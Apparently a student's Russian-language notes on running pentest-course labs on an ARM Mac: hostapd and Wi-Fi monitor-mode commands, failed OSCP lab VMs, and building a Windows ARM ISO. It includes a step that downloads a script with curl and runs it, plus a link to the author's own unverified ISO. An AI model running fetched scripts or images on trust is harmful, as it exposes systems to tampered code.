Для работы hostapd, в конфиге hostapd.conf используй строку `driver=nl80211` для использования нужного драйвера. При поднятии второго интерфейса иногда, при определенных условиях, система выдает segmentation fault и встает почти колом, помогает только ребут. Поэтому при использовании hostapd интерфейс в строке должен быть основным, т.е. `interface=wlan0`, а утилиты которые должны работать параллельно, запускать на сабинтерфейсе, типа wlan0mon.

Несколько полезных команд:

```
# Создать сабинтерфейс с именем wlan0mon
sudo iw dev wlan0 interface add wlan0mon type monitor

# Показать данные по Wireless интерфейсам
sudo iw dev

# Минимально необходимый конфиг hostapd.conf для MT7612U чипсета
$ cat hostapd.conf
interface=wlan0
driver=nl80211
```

Задание сложное, информации в модуле мало, надо сильно вникать и потратить довольно много времени. Я переносил дедлайн пять раз на неделю. Но это чертовски интересно! Обязательно посмотри запись [вебинара](https://apps.skillfactory.ru/learning/course/course-v1:SKILLFACTORY+hack_pentest+2020/block-v1:SKILLFACTORY+hack_pentest+2020+type@sequential+block@81c4a5133fbf4115a59b0fd1b67e8b94/block-v1:SKILLFACTORY+hack_pentest+2020+type@vertical+block@fc0bc2f8aa9f42d99182a5c8f96c068a), там есть хорошие вопросы, которые не освещены в модуле. Там же в вебинаре показываются другие подходящие карты. По идее, другие и не только из вебинара тоже должны работать, если подходят к Кали и даже если нет драйверов под Мак, т.к. в виртуалку пробрасывается само устройство и материнская ОСь не обязательно должна уметь с ним работать.

## Модуль 42. Сертификация OSCP

В модуле шесть лаб, которые надо скачивать в OVA шаблоне и запускать через Virtual Box, на котором не работает из-за разности архитектур. Попытался конвертировать в QEMU (гипервизор, который под капотом у UTM) и запустить, и вроде успешно, и даже работает, но не получает IP адреса. Ни в какую. Проверил пока только на трех лабах, на всех IP адрес не получается. Все последующее относится к одной. Потратил часов 20, результата нет. Судя по всему, это такая особенность этих лаб, намеренно сделанная, что ОСь полноценно не должна работать и поэтому возникает проблема.  Пытался сменить пароль рута при иницииронании рескью режима, при загрузке - не получается. В нем же основной интерфейс в дауне и поднять его не получается. Подключил диск к другой системе, скопировал хэш пароля на целевую систему, но похоже там логин с консоли совсем на проч отключен. По этой же причине чрутом менять его тоже бесполезно. Так же, увидел, что имя интерфейса в конфигах не совпадает с тем, которое в рескью. Изменение его в конфигах так же не принесло результатов. Так же, в каталоге `/etc/network` все вложенные каталоги пусты, чего быть не долно, существует только файл `interfaces` с поднятием lo и того не верно написанного интерфейса с настройкой в DHCP. 
Естественно, перепробовал в настройках гипервизора все типы сетей и даже разные сетевые адаптеры для которых используются разные драйвера. С хост системы не видны даже arp запросы от виртуалки.  

### Поэтому

C сожалением вынужден сообщить, что бросил попытки поднять эти лабы на ARM. Придется либо искать комп с x64, что проще, можно как-то попросить у знакомых. Или же [тут](https://app.pachca.com/chats/6094450?message=90124479) в треде от меня есть предложение по покупке сервера, сообщение от 26 октября 2023.


## Модуль 43. Финальное задание

Запускать лабу можно, но не обязательно. Проще смонтировать диск в Кали и оттуда его изучать.

<details><summary>Спойлер</summary>

Малвари в образе нет

</details> 

## Windows
### Windows Desktop

Windows 10/11 в несколько кликов ставится в Parallels из дистрибутива Parallels. Если найти ARM дистрибутив, должен встать в любом гипервизоре. Я не нашел и пришлось идти по другому пути, описанном в инструкции на сайте [UTM](https://docs.getutm.app/guides/windows/#downloads). Чтобы сильно не вникать сделал выжимку, которая в спойлере.  
Если есть возможность просто скачать официальный ISO'шник под ARM - сделай это.   
Если нет, качай собранный мной [ISO](https://disk.yandex.ru/d/NNjVa0Qz9MxuVQ). Он полноценен - с возможностью ввести в домен, но на английском, языковой пакет доставить не проблема стандартными способами.   
Если хочется собрать винду самостоятельно - смотри спойлер.

<details><summary>Увлекательная сборка Винды из UUP Dump</summary>
<p>

Наверное сразу надо предупредить, что ниже качаются скрипты из интернета и далее что-то делают в системе. Они все были мной просмотрены и запущены. Там нет ничего криминального, что могло бы навредить.

1. Если еще не стоит, поставить [Homebrew](https://brew.sh)

2. Поставить зависимости
    ```
    brew tap minacle/chntpw
    brew install aria2 cabextract wimlib cdrtools minacle/chntpw/chntpw
    ```
    Описание зависимотей из ридми скрипта с сайта uupdump.net:
    > The script requires the following applications:
    >  * cabextract - to extract cabs
    >  * wimlib-imagex - to export files from metadata ESD
    >  * chntpw - to modify registry of first index of boot.wim
    >  * genisoimage or mkisofs - to create ISO image
    
    Далее нужно VPN подключение из другой страны, хост uupdump.net недоступен


4. Скачать список пакетов для скачивания:
    ```
    aria2c --no-conf --log-level=info --log="aria2_download.log" -o"download_list.txt" --allow-overwrite=true --auto-file-renaming=false "http://uupdump.net/get.php?id=e925283b-ad4e-4db1-8da1-e1fc160e5932&pack=en-us&edition=professional&aria2=2"
    ```

5. Скачать пакеты из списка:
    ```
    aria2c --no-conf --log-level=info --log="aria2_download.log" -x16 -s16 -j5 -c -R -d"UUPs"
    ```
    Качаться может долго, общий объем ~3,2 ГБ.

6. Скачать скрипт по сборке файлов в ISO, сделать его исполняемым и запустить:
    ```
    curl https://raw.githubusercontent.com/uup-dump/converter/523e674cc0129278da32be90b3c54ea942502d1b/convert.sh -o convert.sh
    chmod +x convert.sh
    ./convert.sh
    ```
    Если все прошло успешно, в текущем каталоге появится файл 22621.1_PROFESSIONAL_ARM64_EN-US.ISO, с которого и надо установить виртуальную машину.

7. В окне добавления виртуальной машины выбрать Virtualize, затем Windows, затем:  
    Убрать чекбокс "Import VHDX Image"  
    Поставить чекбокс "Install Windows 10 or higher"  
    Поставить чекбокс "Install drivers and SPICE tools"

    Если нет чекбокса "Install Windows 10 or higher", то обновить UTM. В моем случае стояла версия 3.2.4 (58) и на ней не завелось, после обновления до последней на момент установки - 4.1.6 (75) - все  успешно.

</p>
</details> 

### Windows Server

Под ARM пока дистрибутив мной не найден и судя по всему он не ожидается в ближайшем будущем. Поэтому поставил вин сервер х64 через UTM в режиме эмуляции. Работает, но тормозит. При выделенных 8 ядрах в простое ОСь ресурсы почти не жрет, начинаешь открывать окна - тормоза. Елозить мышкой не вариант, даже по RDP. Отрисовка ГУИ долгая и тормозная. В простое пинги стабильные, 1-2 мс, но не редко случаются и замедления, при малейшей нагрузке появляются потери. Банальная установка клиента телнет заняла минут 20 и загрузила проц винды на 90%. Материнская система при этом не тормозит. Если в заданиях будет по-большей части только консоль или обращения к серверу, то работать можно, но зависит от задач. В общем, надо смотреть конкретнее на задания

Пытался сделать практическую работу 25.7. Поставил AD, настроил, дошел до создания пользователей и плюнул, поставил WS на x64. В целом сделать можно, но крайне затруднительно из-за тормозов. Если нет варианта поставить x64, закладывайте на эту лабу день времени, если знаете как ее делать, если нет - больше.

Поставил WS 2022 (описываемое ранее было чем-то другим). Субъективно кажется, что тормозов меньше, но они есть и значительные, можно сказать, что примерно так же. 

CTRL+ALT+DEL нажимается сочетанием FN + Control + Option + Delete
